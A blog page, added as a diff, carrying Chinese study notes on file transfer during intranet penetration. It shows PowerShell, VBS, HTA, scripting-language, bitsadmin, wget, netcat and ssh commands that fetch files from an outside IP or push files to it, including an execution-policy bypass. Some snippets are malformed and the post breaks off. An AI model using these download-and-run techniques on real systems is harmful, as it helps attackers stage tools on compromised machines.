@@ -1,0 +1,1327 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="内网渗透,远程操作," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="内网文件传输powershell文件下载12$d = New-Object System.Net.WebClient$d.DownloadFile(&quot;http://test.com/1.txt&quot;,&quot;c:/1.txt&quot;) 执行脚本： 1powershell -ExecutionPolicy Bypass -File .\1.ps1  有时候powershell的执行权限会被关闭，需要用如下命令打开">
+<meta name="keywords" content="内网渗透,远程操作">
+<meta property="og:type" content="article">
+<meta property="og:title" content="磨皮皮之远程连接">
+<meta property="og:url" content="http://eagerseven.cn/2018/04/25/磨皮皮之远程连接/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="内网文件传输powershell文件下载12$d = New-Object System.Net.WebClient$d.DownloadFile(&quot;http://test.com/1.txt&quot;,&quot;c:/1.txt&quot;) 执行脚本： 1powershell -ExecutionPolicy Bypass -File .\1.ps1  有时候powershell的执行权限会被关闭，需要用如下命令打开">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fqg1vvsosjj30oh0a974h.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fqg25g4ahhj30mu0ehq39.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fqg2897zyhj30my0a2my5.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqg3pf81maj30mu0bajrn.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqg3qjt7scj30hi0drwef.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqg3sjy145j30t30gp75f.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqg4ekormlj30fa05x747.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqg4glhif2j30m505idfp.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqgr0x3jmxj30hu04e743.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqgr1zu6tcj30ad02wt8k.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqgx1v0cf5j30hh0453yn.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqgxaxtsulj30g7054dg2.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqh4wour2lj30ji06oq38.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqh5qmh9wrj30k3025q2v.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqh5s2y5rnj30hu046t9a.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fqha53t6xij30cc02mwe9.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fqha6q6flgj30gi06cdfm.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1fqibegr86fj30it0cajra.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fqic8ihhopj30hs09oq2q.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqkd7spfhfj30hw05l3yb.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqkdj5e6ydj30hu09h743.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqkdmfdfwtj30hu04q3ya.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqkdpqtm2hj30hv07zt8j.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqkfy9oejyj30hv0663yc.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqkgobu24wj30hx09cdfn.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqkkqdv9ixj30hv0500sj.jpg">
+<meta property="og:updated_time" content="2018-10-31T11:54:03.590Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="磨皮皮之远程连接">
+<meta name="twitter:description" content="内网文件传输powershell文件下载12$d = New-Object System.Net.WebClient$d.DownloadFile(&quot;http://test.com/1.txt&quot;,&quot;c:/1.txt&quot;) 执行脚本： 1powershell -ExecutionPolicy Bypass -File .\1.ps1  有时候powershell的执行权限会被关闭，需要用如下命令打开">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fqg1vvsosjj30oh0a974h.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2018/04/25/磨皮皮之远程连接/"/>
+
+
+
+
+
+  <title>磨皮皮之远程连接 | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2018/04/25/磨皮皮之远程连接/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">磨皮皮之远程连接</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-25T10:58:00+08:00">
+                2018-04-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2,048
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="内网文件传输"><a href="#内网文件传输" class="headerlink" title="内网文件传输"></a>内网文件传输</h3><h4 id="powershell文件下载"><a href="#powershell文件下载" class="headerlink" title="powershell文件下载"></a>powershell文件下载</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$d</span> = <span class="built_in">New-Object</span> System.Net.WebClient</span><br><span class="line"><span class="variable">$d</span>.DownloadFile(<span class="string">"http://test.com/1.txt"</span>,<span class="string">"c:/1.txt"</span>)</span><br></pre></td></tr></table></figure>
+<p>执行脚本：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass -File .\<span class="number">1</span>.ps1</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fqg1vvsosjj30oh0a974h.jpg" alt=""></p>
+<p>有时候powershell的执行权限会被关闭，需要用如下命令打开</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell set-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>
+<h4 id="vbs脚本文件下载"><a href="#vbs脚本文件下载" class="headerlink" title="vbs脚本文件下载"></a>vbs脚本文件下载</h4><figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Set xPost=createObject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">xPost.Open &quot;GET&quot;,&quot;HTTP://192.168.1.1/1.txt&quot;,0</span><br><span class="line">xPost.Send()</span><br><span class="line">set sGet=createObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">sGet.Mode=3</span><br><span class="line">sGet.Type=1</span><br><span class="line">sGet.Open()</span><br><span class="line">sGet.Write xPost.ResponseBody</span><br><span class="line">sGet.SaveToFile &quot;c:\1.txt&quot;,2</span><br></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Set args=Wscript.Arguments</span><br><span class="line">Url=&quot;http://120.79.2.221:8080/i.php&quot;</span><br><span class="line">dim xHttp: Set xHttp=createobject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">dim bStrm: Set bStrm=createobject(&quot;Adodb.Stream&quot;)</span><br><span class="line">xHttp.Open &quot;GET&quot;,Url,False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">	.type=1 &apos;</span><br><span class="line">	.open</span><br><span class="line">	.write xHttp.responseBody</span><br><span class="line">	.savetofile &quot;c:\1.txt&quot;,2 &apos;</span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
+<p>执行命令即可实现下载：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript 1.vbs</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fqg25g4ahhj30mu0ehq39.jpg" alt=""></p>
+<h4 id="bitsadmin命令"><a href="#bitsadmin命令" class="headerlink" title="bitsadmin命令"></a>bitsadmin命令</h4><p>win10、win7、server 2012、server 2008有，server 2003、xp没有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://test.com/1.txt c:\1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fqg2897zyhj30my0a2my5.jpg" alt=""></p>
+<h4 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h4><p>可视化操作：</p>
+<p>打开<code>我的电脑</code>,在界面上方找到<code>映射网路驱动器</code></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqg3pf81maj30mu0bajrn.jpg" alt=""></p>
+<p>然后会进入如下页面，选择一个共享文件夹</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqg3qjt7scj30hi0drwef.jpg" alt=""></p>
+<p>此时可能会提示打开网络发现，去高级共享设置里打开就行了</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqg3sjy145j30t30gp75f.jpg" alt=""></p>
+<p>选择好文件夹后点击<code>完成</code>，此时可以在<code>我的电脑</code>里看到映射的网络共享</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqg4ekormlj30fa05x747.jpg" alt=""></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqg4glhif2j30m505idfp.jpg" alt=""></p>
+<p>命令行操作：</p>
+<h4 id="利用telnet"><a href="#利用telnet" class="headerlink" title="利用telnet"></a>利用telnet</h4><p>目标服务器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 23 &lt; nc.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqgr0x3jmxj30hu04e743.jpg" alt=""></p>
+<p>本地下载端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 目标服务器IP 端口</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqgr1zu6tcj30ad02wt8k.jpg" alt=""></p>
+<h4 id="利用hta文件"><a href="#利用hta文件" class="headerlink" title="利用hta文件"></a>利用hta文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var Object = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);</span><br><span class="line">Object.open(&quot;GET&quot;,&quot;http://120.79.2.221：8080/i.php&quot;,false);</span><br><span class="line">Object.send();</span><br><span class="line">if (Object.Status == 200)</span><br><span class="line">&#123;</span><br><span class="line">    var Stream = new ActiveXObject(&quot;ADODB.Stream&quot;);</span><br><span class="line">    Stream.Open();</span><br><span class="line">    Stream.Type = 1;</span><br><span class="line">    Stream.Write(Object.ResponseBody);</span><br><span class="line">    Stream.SaveToFile(&quot;C:\\1.phpt&quot;, 2);</span><br><span class="line">    Stream.Close();</span><br><span class="line">&#125;</span><br><span class="line">window.close();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;HTA:APPLICATION ID=&quot;test&quot;</span><br><span class="line">WINDOWSTATE = &quot;minimize&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>保存为.hta，但是Windows下并不能直接将文件名改为.hta，需要用<code>rename</code>命令进行改名</p>
+<h4 id="利用perl脚本"><a href="#利用perl脚本" class="headerlink" title="利用perl脚本"></a>利用perl脚本</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!perl</span></span><br><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> LWP::Simple;</span><br><span class="line">getstore(<span class="string">"http://120.79.2.221:8080/i.php"</span>,<span class="string">"/root/Desktop/1.txt"</span>);</span><br></pre></td></tr></table></figure>
+<p>运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl 1.pl</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqgx1v0cf5j30hh0453yn.jpg" alt=""></p>
+<h4 id="利用python脚本"><a href="#利用python脚本" class="headerlink" title="利用python脚本"></a>利用python脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">u = urllib2.urlopen(<span class="string">'http://120.79.2.221:8080/i.php'</span>)</span><br><span class="line">localFile = open(<span class="string">'/root/Desktop/1.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">localFile.write(u.read())</span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqgxaxtsulj30g7054dg2.jpg" alt=""></p>
+<h4 id="利用ruby脚本"><a href="#利用ruby脚本" class="headerlink" title="利用ruby脚本"></a>利用ruby脚本</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'net/http'</span></span><br><span class="line">Net::HTTP.start(<span class="string">"http:120.79.2.221:8080"</span>)&#123; <span class="params">|http|</span></span><br><span class="line">    r=http.get(<span class="string">"/i.php"</span>)</span><br><span class="line">    open(<span class="string">"root/Desktop/1.txt"</span>,<span class="string">"wb"</span>)&#123; <span class="params">|file|</span></span><br><span class="line">        file.write(r.body )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="PHP脚本下载"><a href="#PHP脚本下载" class="headerlink" title="PHP脚本下载"></a>PHP脚本下载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$data=@file(&quot;http://120.79.2.221:8080/i.php&quot;);</span><br><span class="line">	$lf=&quot;1.txt&quot;;</span><br><span class="line">	$fh=fopen($lf,&quot;w&quot;);</span><br><span class="line">	fwrite($fh,$data[0]);</span><br><span class="line">	fclose($fh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>需要注意的是，测试发现只能下载txt文件，并且只能保存为txt文件</p>
+<h4 id="wget文件下载"><a href="#wget文件下载" class="headerlink" title="wget文件下载"></a>wget文件下载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://120.79.2.221:8080/i.php -P /root/Desktop</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqh4wour2lj30ji06oq38.jpg" alt=""></p>
+<p><strong>一边打包一边ssh上传一边解压</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar czf - 1.txt | ssh root@120.79.2.221 tar xzf - -C /root/67</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqh5qmh9wrj30k3025q2v.jpg" alt=""></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqh5s2y5rnj30hu046t9a.jpg" alt=""></p>
+<hr>
+<h4 id="dns数据传输"><a href="#dns数据传输" class="headerlink" title="dns数据传输"></a>dns数据传输</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zcf -</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="ftp文件传输"><a href="#ftp文件传输" class="headerlink" title="ftp文件传输"></a>ftp文件传输</h4><p>上传：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">put c:\1.txt</span><br><span class="line">send c:\1.txt</span><br><span class="line">mput c:\*.txt</span><br></pre></td></tr></table></figure>
+<p>下载:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lcd c:\dir		\\设置当前工作路径</span><br><span class="line">get 1.txt		\\下载1.txt</span><br><span class="line">mget *.txt		\\下载多个文件</span><br><span class="line">!chdir			\\查看当前目录</span><br><span class="line">!dir			\\查看当前目录文件</span><br></pre></td></tr></table></figure>
+<h4 id="nc文件传输"><a href="#nc文件传输" class="headerlink" title="nc文件传输"></a>nc文件传输</h4><p><strong>主动下载</strong></p>
+<p>服务器端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 1.txt | nc -l 1234</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fqha53t6xij30cc02mwe9.jpg" alt=""></p>
+<p>下载端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.120.132 1234 &gt; 1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fqha6q6flgj30gi06cdfm.jpg" alt=""></p>
+<p>但是不清楚为什么下载的文件是空的</p>
+<p><strong>主动发送</strong></p>
+<p>下载端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 1234 &gt; 1.txt</span><br></pre></td></tr></table></figure>
+<p>服务器端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.181 1234 &lt; 1.txt</span><br><span class="line">nc 192.168.1.181 1234 &lt; $&#123;tar -jcvf 1.tar.bz2 1.txt&#125;	//压缩后发送</span><br></pre></td></tr></table></figure>
+<h4 id="smb文件传送"><a href="#smb文件传送" class="headerlink" title="smb文件传送"></a>smb文件传送</h4><p>服务端Linux的smb环境配置，编辑/etc/samba/smb.conf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[share]</span><br><span class="line">	comment = my share directory</span><br><span class="line">    path = /home/share</span><br><span class="line">;   browseable = yes</span><br><span class="line">    writable = yes</span><br><span class="line">    guest ok = yes</span><br></pre></td></tr></table></figure>
+<p>然后重启samba服务</p>
+<p>下载端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use o: \\192.168.120.128\share</span><br><span class="line">dir o:</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fqibegr86fj30it0cajra.jpg" alt=""></p>
+<h3 id="文件编译"><a href="#文件编译" class="headerlink" title="文件编译"></a>文件编译</h3><h4 id="利用powershell进行文件编译"><a href="#利用powershell进行文件编译" class="headerlink" title="利用powershell进行文件编译"></a>利用powershell进行文件编译</h4><p>exe2text.ps1</p>
